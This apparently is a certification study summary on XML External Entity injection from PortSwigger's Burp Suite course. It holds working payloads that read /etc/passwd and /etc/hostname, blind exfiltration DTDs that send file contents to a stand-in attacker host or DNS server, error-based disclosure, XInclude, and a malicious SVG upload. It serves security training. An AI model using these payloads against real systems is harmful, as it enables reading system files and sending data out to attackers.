##### PortSwigger BurpSuite Certification Summary
# XML External Entity Injection
XML data might be used to retrieve information for which entities are defined. A form can look like this:
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
and can be altered to use an external document type definition (DTD) that defines an entity which accesses the file system:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
Similarly, requests to other hosts (see SSRF) can be made.

In case regular entities are not allowed, XML parameter entities might be. They are defined as follows:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
and the entity is referenced like this `%xxe;`.

### Blind XXE
A DTD file can be served on a host that is controlled by the attack and can be used to perform a DNS query. The DTD defines a call to the DNS server:
```
# exploit.dtd

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'DNS-SERVER-ADDRESS/?x=%file;'>">
%eval;
%exfiltrate;
```
Which is triggered by a XXE injection:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://HOST/exploit.dtd"> %xxe;]>
<stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>
```
##### Error Messages
Loading inexistent files will result in an error message which can be configured to display file content. Similarly to above, a malicious DTD file is hosted:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
and triggered the same way.

The reason for using external DTD is the heavy restriction in internal DTDs, which does not allow to define a parameter within another. If no external DTD can be used, it might still be possible to carry out an attack by **utilizing an internal DTD to redefine the external one** (requires a hybrid usage).

#### XInclude Attacks
This attack is useful when there is an XML document on the server which is, among other things, built up by some user input. `XInclude` offers the functionality to build XML files from others and therefore offers an attacker the opportunity to inject custom XML code:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
The upper line references the `XInclude` namespace, a necessety. The lower line then includes the content of a file of interest. As it is not an XML formatted file, the tag `parse="text"` is used. 

### XXE via File Upload
Certain file systems use XML in their data structure, such as **DOCX** and **SVG**. A file upload can therefore be abused to perform an XXE injection. The following code is an SVG image with malicious XML:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### Change the Content Type
In some cases, multiple content types are supported. If this includes XML, it offers an attack surface for XXE injection. Changing the type is straightforward:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
becomes
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```